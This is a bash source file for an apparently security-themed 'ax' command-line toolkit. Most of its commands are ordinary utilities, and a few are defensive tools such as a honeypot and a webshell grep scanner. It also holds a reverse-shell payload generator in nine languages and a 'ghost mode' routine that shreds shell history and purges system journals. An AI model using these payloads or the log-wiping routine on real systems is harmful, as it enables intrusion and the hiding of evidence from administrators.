cmd_wallpaper() {
    local wp_dir
    local ax_root
    ax_root=$(find_asterix_root)
    wp_dir="${ax_root}/assets/wallpapers"
    [ -d "$wp_dir" ] || wp_dir="/etc/asterix/assets/wallpapers"

    if [ -d "$wp_dir" ]; then
        local chosen
        chosen=$(find "$wp_dir" -type f \( -name "*.png" -o -name "*.jpg" \) 2>/dev/null | shuf -n 1)
        if [ -n "$chosen" ]; then
            echo -e "${C_CYAN}[*] Setting wallpaper:${C_RESET} ${C_YELLOW}${chosen}${C_RESET}"
            feh --bg-scale "$chosen" 2>/dev/null || true
            if command -v xfconf-query >/dev/null 2>&1; then
                xfconf-query -c xfce4-desktop -p /backdrop/screen0/monitor0/workspace0/last-image -s "$chosen" 2>/dev/null || true
            fi
            echo -e "${C_GREEN}[✔] Wallpaper updated!${C_RESET}"
        fi
    else
        echo -e "${C_YELLOW}[!] Wallpapers directory not found.${C_RESET}"
    fi
}

cmd_hud() {
    local action="${1:-restart}"
    local hud_conf="/etc/asterix/desktop-env/conky/asterix-hud.conkyrc"
    [ -f "$hud_conf" ] || hud_conf="desktop-env/conky/asterix-hud.conkyrc"

    case "$action" in
        stop|off)
            echo -e "${C_YELLOW}[*] Stopping ASTERIX HUD...${C_RESET}"
            killall conky 2>/dev/null || true
            echo -e "${C_GREEN}[✔] HUD terminated.${C_RESET}"
            ;;
        start|on)
            echo -e "${C_CYAN}[*] Starting ASTERIX Cyber HUD Telemetry...${C_RESET}"
            killall conky 2>/dev/null || true
            if [ -f "$hud_conf" ] && command -v conky >/dev/null 2>&1; then
                conky -c "$hud_conf" -d 2>/dev/null || true
                echo -e "${C_GREEN}[✔] HUD started!${C_RESET}"
            else
                echo -e "${C_RED}[!] Conky or HUD config not available.${C_RESET}"
            fi
            ;;
        restart|*)
            echo -e "${C_CYAN}[*] Restarting ASTERIX HUD Overlay...${C_RESET}"
            killall conky 2>/dev/null || true
            if [ -f "$hud_conf" ] && command -v conky >/dev/null 2>&1; then
                conky -c "$hud_conf" -d 2>/dev/null || true
                echo -e "${C_GREEN}[✔] HUD active!${C_RESET}"
            fi
            ;;
    esac
}

# ---------------------------------------------------------------------
# 7. File, Search & Archive Utilities
# ---------------------------------------------------------------------

cmd_compress() {
    local target="$1"
    local archive="${2:-${target}.tar.gz}"
    if [ -z "$target" ]; then
        echo -e "${C_RED}[!] Error: Target required to compress.${C_RESET}\nUsage: ax compress <folder_or_file> [archive_name.tar.gz]"
        exit 1
    fi
    echo -e "${C_CYAN}[*] Compressing ${target} into ${archive}...${C_RESET}"
    tar -czf "$archive" "$target"
    echo -e "${C_GREEN}[✔] Archive created: ${archive}${C_RESET}"
}

cmd_extract() {
    local archive="$1"
    if [ -z "$archive" ] || [ ! -f "$archive" ]; then
        echo -e "${C_RED}[!] Error: Archive file not found.${C_RESET}\nUsage: ax extract <archive_file>"
        exit 1
    fi
    echo -e "${C_CYAN}[*] Extracting ${archive}...${C_RESET}"
    case "$archive" in
        *.tar.bz2|*.tbz2) tar -xjf "$archive" ;;
        *.tar.gz|*.tgz)   tar -xzf "$archive" ;;
        *.tar.xz)         tar -xJf "$archive" ;;
        *.tar)            tar -xf "$archive" ;;
        *.zip)            unzip "$archive" ;;
        *)                echo -e "${C_RED}[!] Unrecognized archive format.${C_RESET}" ;;
    esac
    echo -e "${C_GREEN}[✔] Extracted successfully.${C_RESET}"
}

cmd_find_large() {
    local dir="${1:-.}"
    echo -e "${C_CYAN}${C_BOLD}[*] Top 15 Largest Files in ${dir}:${C_RESET}\n"
    find "$dir" -type f -exec du -h {} + 2>/dev/null | sort -rh | head -n 15
}

# ---------------------------------------------------------------------
# 8. Elite Cyber Warfare, Anti-Forensics, Deception & Tactical Ops
# ---------------------------------------------------------------------

cmd_matrix() {
    echo -e "${C_GREEN}[*] Initializing Cybernetic Neural Stream (Press 'q' or Ctrl+C to disconnect)...${C_RESET}"
    sleep 0.5
    local lines cols
    lines=$(tput lines 2>/dev/null || echo 24)
    cols=$(tput cols 2>/dev/null || echo 80)
    
    echo -ne "\033[?25l"
    trap 'echo -ne "\033[?25h\033[0m\033[2J\033[H"; return 0' INT TERM EXIT
    
    clear
    local chars="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%&*+-=<>{}[]"
    local char_len=${#chars}
    
    declare -A y
    for ((i=0; i<cols; i+=2)); do
        y[$i]=$((RANDOM % lines))
    done
    
    local count=0
    while true; do
        for ((x=0; x<cols; x+=2)); do
            local current_y=${y[$x]:-1}
            local rand_idx=$((RANDOM % char_len))
            local rand_char="${chars:$rand_idx:1}"
            
            # White leading head
            echo -ne "\033[${current_y};${x}H\033[38;5;231m\033[1m${rand_char}"
            
            # Glowing green trailer
            if [ "$current_y" -gt 1 ]; then
                local prev_y=$((current_y - 1))
                echo -ne "\033[${prev_y};${x}H\033[38;5;46m${chars:$((RANDOM % char_len)):1}"
            fi
            # Dim emerald trailer
            if [ "$current_y" -gt 4 ]; then
                local trail_y=$((current_y - 4))
                echo -ne "\033[${trail_y};${x}H\033[38;5;28m${chars:$((RANDOM % char_len)):1}"
            fi
            # Clear old tail
            if [ "$current_y" -gt 12 ]; then
                local clear_y=$((current_y - 12))
                echo -ne "\033[${clear_y};${x}H "
            fi
            
            y[$x]=$(( (current_y + 1) % lines ))
            if [ "${y[$x]}" -eq 0 ]; then
                for ((c=1; c<=lines; c++)); do
                    echo -ne "\033[${c};${x}H "
                done
                y[$x]=1
            fi
        done
        
        read -t 0.05 -n 1 key 2>/dev/null || true
        if [ "$key" = "q" ] || [ "$key" = "Q" ]; then
            break
        fi
        
        count=$((count + 1))
        if [ "$count" -ge 600 ]; then
            if [ ! -t 0 ]; then break; fi
        fi
    done
    
    echo -ne "\033[?25h\033[0m\033[2J\033[H"
    echo -e "${C_CYAN}[✔] Neural stream disconnected.${C_RESET}"
}

cmd_stealth() {
    echo -e "${C_RED}${C_BOLD}[!] INITIATING ASTERIX GHOST MODE (ANTI-FORENSICS)...${C_RESET}\n"
    
    echo -e "${C_CYAN}[1/6] Purging volatile memory and temporary directories...${C_RESET}"
    run_as_root rm -rf /tmp/* /var/tmp/* /dev/shm/* 2>/dev/null || true
    echo -e "${C_GREEN}      [✔] /tmp, /var/tmp, /dev/shm wiped.${C_RESET}"
    
    echo -e "${C_CYAN}[2/6] Shredding shell command histories...${C_RESET}"
    history -c 2>/dev/null || true
    [ -f "$HOME/.bash_history" ] && shred -u -n 3 "$HOME/.bash_history" 2>/dev/null || rm -f "$HOME/.bash_history"
    [ -f "$HOME/.zsh_history" ] && shred -u -n 3 "$HOME/.zsh_history" 2>/dev/null || rm -f "$HOME/.zsh_history"
    [ -f "$HOME/.history" ] && rm -f "$HOME/.history" 2>/dev/null || true
    export HISTFILE=/dev/null
    export HISTSIZE=0
    set +o history 2>/dev/null || true
    echo -e "${C_GREEN}      [✔] Shell history obliterated. HISTFILE=/dev/null active.${C_RESET}"
    
    echo -e "${C_CYAN}[3/6] Purging systemd journal logs & auth caches...${C_RESET}"
    if command -v journalctl >/dev/null 2>&1; then
        run_as_root journalctl --rotate 2>/dev/null || true
        run_as_root journalctl --vacuum-time=1s 2>/dev/null || true
    fi
    echo -e "${C_GREEN}      [✔] System journal rotated and purged.${C_RESET}"
    
    echo -e "${C_CYAN}[4/6] Flushing DNS resolver caches...${C_RESET}"
    if command -v resolvectl >/dev/null 2>&1; then
        run_as_root resolvectl flush-caches 2>/dev/null || true
    elif command -v systemd-resolve >/dev/null 2>&1; then
        run_as_root systemd-resolve --flush-caches 2>/dev/null || true
    fi
    echo -e "${C_GREEN}      [✔] DNS caches flushed.${C_RESET}"
    
    echo -e "${C_CYAN}[5/6] Clearing clipboard and screen buffers...${C_RESET}"
    if command -v xclip >/dev/null 2>&1; then
        echo -n "" | xclip -selection clipboard 2>/dev/null || true
        echo -n "" | xclip -selection primary 2>/dev/null || true
    fi
    echo -e "${C_GREEN}      [✔] Clipboard scrubbed.${C_RESET}"
    
    echo -e "${C_CYAN}[6/6] Syncing disk and clearing RAM pagecache...${C_RESET}"
    run_as_root sync
    if [ -w "/proc/sys/vm/drop_caches" ]; then
        run_as_root sh -c 'echo 3 > /proc/sys/vm/drop_caches' 2>/dev/null || true
    fi
    echo -e "${C_GREEN}      [✔] Memory buffers cleared.${C_RESET}"
    
    echo -e "\n${C_PURPLE}${C_BOLD}[★] GHOST MODE ENGAGED. Digital footprint scrubbed.${C_RESET}\n"
}

cmd_killswitch() {
    local action="${1:-engage}"
    if [ "$action" = "--restore" ] || [ "$action" = "restore" ] || [ "$action" = "off" ]; then
        echo -e "${C_CYAN}[*] Disengaging Killswitch: Restoring network stack...${C_RESET}"
        if command -v iptables >/dev/null 2>&1; then
            run_as_root iptables -P INPUT ACCEPT 2>/dev/null || true
            run_as_root iptables -P FORWARD ACCEPT 2>/dev/null || true
            run_as_root iptables -P OUTPUT ACCEPT 2>/dev/null || true
            run_as_root iptables -F 2>/dev/null || true
        fi
        if command -v nmcli >/dev/null 2>&1; then
            run_as_root nmcli networking on 2>/dev/null || true
        fi
        echo -e "${C_GREEN}[✔] Network stack restored to normal operational state.${C_RESET}"
        return 0
    fi

    echo -e "${C_RED}${C_BOLD}"
    cat << 'EOF'
    ███████╗███╗   ███╗███████╗██████╗  ██████╗ ███████╗███╗   ██╗ ██████╗██╗   ██╗
    ██╔════╝████╗ ████║██╔════╝██╔══██╗██╔════╝ ██╔════╝████╗  ██║██╔════╝╚██╗ ██╔╝
    █████╗  ██╔████╔██║█████╗  ██████╔╝██║  ███╗█████╗  ██╔██╗ ██║██║      ╚████╔╝ 
    ██╔══╝  ██║╚██╔╝██║██╔══╝  ██╔══██╗██║   ██║██╔══╝  ██║╚██╗██║██║       ╚██╔╝  
    ███████╗██║ ╚═╝ ██║███████╗██║  ██║╚██████╔╝███████╗██║ ╚████║╚██████╗   ██║   
    ╚══════╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═══╝ ╚═════╝   ╚═╝   
EOF
    echo -e "              >> EMERGENCY DEFENSE LOCKDOWN ENGAGED <<${C_RESET}\n"
    
    echo -e "${C_YELLOW}[!] Severing all network interfaces...${C_RESET}"
    if command -v nmcli >/dev/null 2>&1; then
        run_as_root nmcli networking off 2>/dev/null || true
    fi
    for iface in $(ip -o link show 2>/dev/null | awk -F': ' '{print $2}' | grep -v 'lo'); do
        run_as_root ip link set "$iface" down 2>/dev/null || true
    done
    
    echo -e "${C_YELLOW}[!] Dropping all IP packets (INPUT/FORWARD/OUTPUT -> DROP)...${C_RESET}"
    if command -v iptables >/dev/null 2>&1; then
        run_as_root iptables -P INPUT DROP 2>/dev/null || true
        run_as_root iptables -P FORWARD DROP 2>/dev/null || true
        run_as_root iptables -P OUTPUT DROP 2>/dev/null || true
    fi

    echo -e "${C_YELLOW}[!] Terminating active remote sessions (SSH/Telnet)...${C_RESET}"
    pkill -9 sshd 2>/dev/null || true
    
    echo -e "\n${C_RED}${C_BOLD}[☠] SYSTEM ISOLATED. All RF & Ethernet links severed.${C_RESET}"
    echo -e "${C_GRAY}To restore network connectivity, execute: ${C_WHITE}ax killswitch restore${C_RESET}\n"
}

cmd_decoy() {
    local port="${1:-8080}"
    local logfile="./loot/decoy-${port}.log"
    mkdir -p "./loot" 2>/dev/null || logfile="/tmp/asterix-decoy-${port}.log"
    
    echo -e "${C_YELLOW}${C_BOLD}[*] DEPLOYING ASTERIX HONEYPOT DECOY ON PORT: ${C_WHITE}${port}${C_RESET}"
    echo -e "${C_GRAY}Logging intrusion attempts to: ${logfile}${C_RESET}"
    echo -e "${C_CYAN}[*] Waiting for incoming adversary connections (Ctrl+C to stop)...${C_RESET}\n"
    
    if command -v python3 >/dev/null 2>&1; then
        python3 -c "
import socket, sys, datetime
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
try:
    s.bind(('0.0.0.0', int('$port')))
    s.listen(5)
    while True:
        conn, addr = s.accept()
        now = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        print(f'\033[38;5;196m\033[1m[ALERT] INTRUSION DETECTED from {addr[0]}:{addr[1]} at {now}!\033[0m')
        data = conn.recv(1024)
        banner = b'SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1\r\n' if '$port' == '22' else b'HTTP/1.1 200 OK\r\nServer: Apache/2.4.41 (Ubuntu)\r\nContent-Length: 0\r\n\r\n'
        conn.sendall(banner)
        payload_preview = data.decode('utf-8', errors='replace')[:120].strip()
        print(f'\033[38;5;220m  Payload: {payload_preview}\033[0m')
        with open('$logfile', 'a') as f:
            f.write(f'[{now}] Source: {addr[0]}:{addr[1]} | Payload: {payload_preview}\n')
        conn.close()
except KeyboardInterrupt:
    print('\n\033[38;5;46m[*] Honeypot deactivated.\033[0m')
    s.close()
"
    elif command -v nc >/dev/null 2>&1; then
        while true; do
            echo -e "${C_RED}[*] Honeypot listener active on port ${port}...${C_RESET}"
            nc -l -v -p "$port" 2>&1 | tee -a "$logfile"
        done
    else
        echo -e "${C_RED}[!] Python3 or netcat required to deploy honeypot.${C_RESET}"
    fi
}

cmd_payload() {
    local lhost="${1:-10.0.0.1}"
    local lport="${2:-4444}"
    
    echo -e "${C_CYAN}${C_BOLD}ASTERIX CYBERNETIC REVERSE SHELL & PAYLOAD GENERATOR${C_RESET}"
    echo -e "Target LHOST: ${C_YELLOW}${lhost}${C_RESET} | LPORT: ${C_YELLOW}${lport}${C_RESET}\n"
    
    echo -e "${C_WHITE}${C_BOLD}[1] Bash (TCP Interactive):${C_RESET}"
    echo -e "${C_GREEN}bash -i >& /dev/tcp/${lhost}/${lport} 0>&1${C_RESET}\n"
    
    echo -e "${C_WHITE}${C_BOLD}[2] Bash (Readline 5 /exec):${C_RESET}"
    echo -e "${C_GREEN}0<&196;exec 196<>/dev/tcp/${lhost}/${lport}; sh <&196 >&196 2>&196${C_RESET}\n"
    
    echo -e "${C_WHITE}${C_BOLD}[3] Python3 (PTY Spawn):${C_RESET}"
    echo -e "${C_GREEN}python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"${lhost}\",${lport}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")'${C_RESET}\n"
    
    echo -e "${C_WHITE}${C_BOLD}[4] Netcat Traditional (-e):${C_RESET}"
    echo -e "${C_GREEN}nc -e /bin/bash ${lhost} ${lport}${C_RESET}\n"
    
    echo -e "${C_WHITE}${C_BOLD}[5] Netcat OpenBSD (mkfifo):${C_RESET}"
    echo -e "${C_GREEN}rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${lhost} ${lport} >/tmp/f${C_RESET}\n"
    
    echo -e "${C_WHITE}${C_BOLD}[6] Socat Encrypted/TTY:${C_RESET}"
    echo -e "${C_GREEN}socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:${lhost}:${lport}${C_RESET}\n"
    
    echo -e "${C_WHITE}${C_BOLD}[7] PowerShell (Windows Cross-Target):${C_RESET}"
    echo -e "${C_GREEN}\$c=New-Object System.Net.Sockets.TCPClient('${lhost}',${lport});\$s=\$c.GetStream();[byte[]]\$b=0..65535|%{0};while((\$i=\$s.Read(\$b,0,\$b.Length)) -ne 0){\$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$b,0,\$i);\$r=(iex \$d 2>&1 | Out-String );\$r2=\$r+'PS '+(pwd).Path+'> ';\$s2=([text.encoding]::ASCII).GetBytes(\$r2);\$s.Write(\$s2,0,\$s2.Length);\$s.Flush()};\$c.Close()${C_RESET}\n"
    
    echo -e "${C_WHITE}${C_BOLD}[8] PHP Execution:${C_RESET}"
    echo -e "${C_GREEN}php -r '\$sock=fsockopen(\"${lhost}\",${lport});exec(\"/bin/bash -i <&3 >&3 2>&3\");'${C_RESET}\n"

    echo -e "${C_WHITE}${C_BOLD}[9] Node.js:${C_RESET}"
    echo -e "${C_GREEN}(function(){var net=require(\"net\"),cp=require(\"child_process\"),sh=cp.spawn(\"/bin/sh\",[]);var client=new net.Socket();client.connect(${lport},\"${lhost}\",function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})();${C_RESET}\n"
    
    echo -e "${C_CYAN}[i] To catch incoming shell on this host: ${C_YELLOW}ax ports${C_RESET} or ${C_YELLOW}nc -lvnp ${lport}${C_RESET}\n"
}

cmd_subdomains() {
    local domain="$1"
    if [ -z "$domain" ]; then
        echo -e "${C_RED}[!] Error: Target domain required.${C_RESET}\nUsage: ax subdomains <example.com>"
        exit 1
    fi
    echo -e "${C_CYAN}${C_BOLD}[*] Querying Certificate Transparency (crt.sh) for subdomains of: ${C_WHITE}${domain}${C_RESET}\n"
    
    local results
    results=$(curl -s "https://crt.sh/?q=%25.${domain}&output=json" 2>/dev/null | grep -o '"name_value": *"[^"]*"' | cut -d'"' -f4 | sed 's/\\n/\n/g' | grep -v '^\*' | sort -u || true)
    
    if [ -z "$results" ]; then
        echo -e "${C_YELLOW}[!] No subdomains identified via crt.sh or network connection unavailable.${C_RESET}"
    else
        local count
        count=$(echo "$results" | wc -l)
        echo -e "${C_GREEN}[✔] Discovered ${count} unique subdomains:${C_RESET}\n"
        echo "$results" | while read -r sub; do
            [ -z "$sub" ] && continue
            local ip
            ip=$(dig +short "$sub" 2>/dev/null | head -n 1 || true)
            if [ -n "$ip" ]; then
                echo -e "  ${C_CYAN}➜${C_RESET} ${C_WHITE}${sub}${C_RESET} -> ${C_GREEN}${ip}${C_RESET}"
            else
                echo -e "  ${C_GRAY}➜ ${sub}${C_RESET}"
            fi
        done
    fi
    echo ""
}

cmd_wifi_scan() {
    echo -e "${C_CYAN}${C_BOLD}[*] SCANNING WIRELESS SPECTRUM & ACCESS POINTS...${C_RESET}\n"
    if command -v nmcli >/dev/null 2>&1; then
        echo -e "${C_YELLOW}Scanning via NetworkManager...${C_RESET}"
        nmcli -f SSID,BSSID,CHAN,FREQ,SIGNAL,SECURITY dev wifi list --rescan yes 2>/dev/null || nmcli dev wifi list
    elif command -v iwlist >/dev/null 2>&1; then
        local iface
        iface=$(iw dev 2>/dev/null | grep Interface | awk '{print $2}' | head -n 1)
        [ -z "$iface" ] && iface="wlan0"
        echo -e "${C_YELLOW}Scanning via iwlist on ${iface}...${C_RESET}"
        run_as_root iwlist "$iface" scan 2>/dev/null | grep -E 'ESSID|Address|Quality|Encryption'
    else
        echo -e "${C_RED}[!] Wireless tools (nmcli/iw/iwlist) not detected or wireless interface unavailable.${C_RESET}"
    fi
}

cmd_malware_scan() {
    local target_dir="${1:-.}"
    echo -e "${C_RED}${C_BOLD}[*] INITIATING TACTICAL WEBSHELL & MALWARE SIGNATURE AUDIT in: ${C_WHITE}${target_dir}${C_RESET}\n"
    
    local found=0
    echo -e "${C_CYAN}[1/4] Scanning for Obfuscated PHP Evals / Base64 Loaders...${C_RESET}"
    local p_evals
    p_evals=$(grep -rnEI "eval\(.*base64_decode" "$target_dir" 2>/dev/null | head -n 10 || true)
    if [ -n "$p_evals" ]; then
        echo -e "${C_RED}[ALERT] Found potential webshell base64 evals:${C_RESET}"
        echo "$p_evals"
        found=$((found + 1))
    else
        echo -e "${C_GREEN}      [✔] No base64 decode evals detected.${C_RESET}"
    fi
    
    echo -e "${C_CYAN}[2/4] Scanning for Web Command Wrappers (system, shell_exec, passthru)...${C_RESET}"
    local p_execs
    p_execs=$(grep -rnEI "(shell_exec|passthru|system\(\$_GET|system\(\$_POST)" "$target_dir" 2>/dev/null | head -n 10 || true)
    if [ -n "$p_execs" ]; then
        echo -e "${C_RED}[ALERT] Found raw command execution entry points:${C_RESET}"
        echo "$p_execs"
        found=$((found + 1))
    else
        echo -e "${C_GREEN}      [✔] Clean.${C_RESET}"
    fi
    
    echo -e "${C_CYAN}[3/4] Scanning for Hidden / World-Writable Binaries...${C_RESET}"
    local p_hidden
    p_hidden=$(find "$target_dir" -type f -name ".*" -perm /111 2>/dev/null | head -n 10 || true)
    if [ -n "$p_hidden" ]; then
        echo -e "${C_YELLOW}[!] Discovered hidden executable files:${C_RESET}"
        echo "$p_hidden"
    else
        echo -e "${C_GREEN}      [✔] Clean.${C_RESET}"
    fi
    
    echo -e "${C_CYAN}[4/4] Auditing Local Cron Schedules & System Timers...${C_RESET}"
    if [ -r "/etc/crontab" ]; then
        grep -v '^#' /etc/crontab | grep -v '^$' || true
    fi
    crontab -l 2>/dev/null || true
    
    echo -e "\n${C_BOLD}Audit complete: ${found} potential security alerts flagged.${C_RESET}\n"
}

cmd_exif() {
    local target="$1"
    local opt="${2:-}"
    if [ -z "$target" ]; then
        echo -e "${C_RED}[!] Error: File required.${C_RESET}\nUsage: ax exif <file.jpg|pdf> [--strip]"
        exit 1
    fi
    
    if [ "$opt" = "--strip" ] || [ "$opt" = "-s" ]; then
        echo -e "${C_YELLOW}[*] Stripping metadata from ${target}...${C_RESET}"
        if command -v exiftool >/dev/null 2>&1; then
            exiftool -all= -overwrite_original "$target"
            echo -e "${C_GREEN}[✔] Metadata obliterated via ExifTool.${C_RESET}"
        elif command -v mogrify >/dev/null 2>&1; then
            mogrify -strip "$target"
            echo -e "${C_GREEN}[✔] Image metadata stripped via ImageMagick.${C_RESET}"
        else
            echo -e "${C_RED}[!] Please install exiftool or imagemagick (ax install exiftool).${C_RESET}"
        fi
        return 0
    fi
    
    echo -e "${C_CYAN}${C_BOLD}[*] EXTRACTING FORENSIC METADATA: ${C_WHITE}${target}${C_RESET}\n"
    if command -v exiftool >/dev/null 2>&1; then
        exiftool "$target"
    elif command -v identify >/dev/null 2>&1; then
        identify -verbose "$target" | grep -iE 'exif|date|camera|make|model|gps'
    elif command -v strings >/dev/null 2>&1; then
        echo -e "${C_YELLOW}[!] Using strings analysis fallback...${C_RESET}"
        strings "$target" | grep -iE 'camera|canon|nikon|sony|apple|gps|created|photoshop|adobe' | head -n 25
    else
        echo -e "${C_RED}[!] Install exiftool for deep forensic extraction (ax install exiftool).${C_RESET}"
    fi
}

cmd_banner_grab() {
    local host="$1"
    local port="${2:-80}"
    if [ -z "$host" ]; then
        echo -e "${C_RED}[!] Error: Host required.${C_RESET}\nUsage: ax banner-grab <host> [port]"
        exit 1
    fi
    echo -e "${C_CYAN}[*] Grabbing Service Banner from ${C_WHITE}${host}:${port}${C_RESET}...\n"
    if command -v nc >/dev/null 2>&1; then
        echo -e "HEAD / HTTP/1.0\r\n\r\n" | nc -w 3 -v "$host" "$port" 2>/dev/null | head -n 30 || true
    elif command -v curl >/dev/null 2>&1; then
        curl -sI -m 3 "${host}:${port}" || true
    else
        (exec 3<>/dev/tcp/"$host"/"$port" && echo -e "HEAD / HTTP/1.0\r\n\r\n" >&3 && cat <&3 | head -n 30) 2>/dev/null || echo -e "${C_RED}[!] Connection timed out or failed.${C_RESET}"
    fi
    echo ""
}

cmd_docker_audit() {
    echo -e "${C_CYAN}${C_BOLD}[*] AUDITING CONTAINER SUBSYSTEM & DOCKER ENGINE...${C_RESET}\n"
    if ! command -v docker >/dev/null 2>&1 && ! command -v podman >/dev/null 2>&1; then
        echo -e "${C_YELLOW}[!] Docker/Podman is not installed on this system.${C_RESET}"
        return 0
    fi
    local engine="docker"
    command -v podman >/dev/null 2>&1 && engine="podman"
    
    echo -e "${C_GREEN}[✔] Engine detected: ${engine}${C_RESET}"
    echo -e "\n${C_WHITE}${C_BOLD}Active Containers:${C_RESET}"
    $engine ps --format "table {{.ID}}\t{{.Image}}\t{{.Status}}\t{{.Ports}}\t{{.Names}}" 2>/dev/null || echo "Daemon not running."
    
    echo -e "\n${C_WHITE}${C_BOLD}Container Escape & Security Checks:${C_RESET}"
    if [ -S "/var/run/docker.sock" ]; then
        echo -e "  ${C_RED}[!] Docker socket (/var/run/docker.sock) exists and is accessible!${C_RESET}"
        ls -la /var/run/docker.sock
    else
        echo -e "  ${C_GREEN}[✔] No exposed local docker.sock socket in /var/run.${C_RESET}"
    fi
    
    if [ -f "/.dockerenv" ] || grep -q 'docker\|containerd' /proc/1/cgroup 2>/dev/null; then
        echo -e "  ${C_PURPLE}[★] CURRENT SESSION IS EXECUTING INSIDE A CONTAINER ENVIRONMENT!${C_RESET}"
    else
        echo -e "  ${C_CYAN}[i] Running on host bare metal or VM.${C_RESET}"
    fi
    echo ""
}

cmd_tor_status() {
    echo -e "${C_CYAN}${C_BOLD}[*] ASTERIX ONION ROUTING & PRIVACY AUDIT...${C_RESET}\n"
    
    if pgrep -x tor >/dev/null 2>&1; then
        echo -e "${C_GREEN}[✔] Tor daemon is active (PID: $(pgrep -x tor | head -n 1))${C_RESET}"
    else
        echo -e "${C_YELLOW}[!] Tor daemon is not currently running.${C_RESET}"
    fi
    
    echo -e "${C_CYAN}[*] Testing external Tor connection via SOCKS5 proxy (127.0.0.1:9050)...${C_RESET}"
    local tor_check
    tor_check=$(curl -s --socks5 127.0.0.1:9050 https://check.torproject.org/api/ip 2>/dev/null || true)
    
    if [[ "$tor_check" == *"IsTor\":true"* ]]; then
        local ip
        ip=$(echo "$tor_check" | grep -o '"IP":"[^"]*"' | cut -d'"' -f4)
        echo -e "${C_GREEN}${C_BOLD}[✔] SECURE: Connected through Tor Network! Exit IP: ${C_WHITE}${ip}${C_RESET}"
    else
        echo -e "${C_RED}[!] Direct connection: Tor proxy is not routing traffic.${C_RESET}"
        local pub_ip
        pub_ip=$(curl -s -m 3 https://api.ipify.org 2>/dev/null || echo "Unknown")
        echo -e "${C_YELLOW}[!] Your public visible IP: ${pub_ip}${C_RESET}"
    fi
    echo ""
}

cmd_speedtest() {
    echo -e "${C_CYAN}${C_BOLD}[*] ASTERIX HIGH-VELOCITY NETWORK BENCHMARK...${C_RESET}\n"
    echo -e "${C_YELLOW}[1/2] Measuring ICMP latency to Cloudflare (1.1.1.1)...${C_RESET}"
    ping -c 4 1.1.1.1 2>/dev/null || echo "Ping failed."
    
    echo -e "\n${C_YELLOW}[2/2] Measuring downstream throughput (10MB payload)...${C_RESET}"
    if command -v curl >/dev/null 2>&1; then
        curl -o /dev/null -w "Download speed: %{speed_download} bytes/sec\nTotal time: %{time_total}s\n" -s "https://speed.cloudflare.com/__down?bytes=10000000" 2>/dev/null || echo "Speed test failed."
    fi
    echo ""
}

cmd_qr() {
    local text="$*"
    if [ -z "$text" ]; then
        echo -e "${C_RED}[!] Error: Text or URL required.${C_RESET}\nUsage: ax qr <text_or_url>"
        exit 1
    fi
    if command -v qrencode >/dev/null 2>&1; then
        qrencode -t ANSIUTF8 "$text"
    elif command -v python3 >/dev/null 2>&1; then
        python3 -c "
import urllib.parse, sys
try:
    import qrcode
    qr = qrcode.QRCode()
    qr.add_data('''$text''')
    qr.print_ascii(invert=True)
except ImportError:
    print('\033[38;5;220m[i] Terminal QR code generator fallback:\033[0m')
    enc = urllib.parse.quote('''$text''')
    print(f'https://api.qrserver.com/v1/create-qr-code/?size=250x250&data={enc}')
"
    else
        echo -e "${C_YELLOW}[*] Install qrencode for instant terminal QR (ax install qrencode).${C_RESET}"
    fi
}

